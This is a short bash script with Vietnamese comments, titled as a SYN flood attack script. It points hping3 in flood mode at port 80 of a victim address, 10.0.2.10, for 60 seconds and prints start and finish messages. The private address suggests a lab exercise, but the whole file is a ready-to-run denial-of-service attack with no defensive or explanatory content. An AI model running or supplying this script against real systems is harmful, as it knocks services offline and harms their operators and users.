
#!/bin/bash
# Kich ban tan cong SYN Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau SYN Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 -S -p 80 --flood $VICTIM
echo "Hoan tat tan cong SYN Flood!"

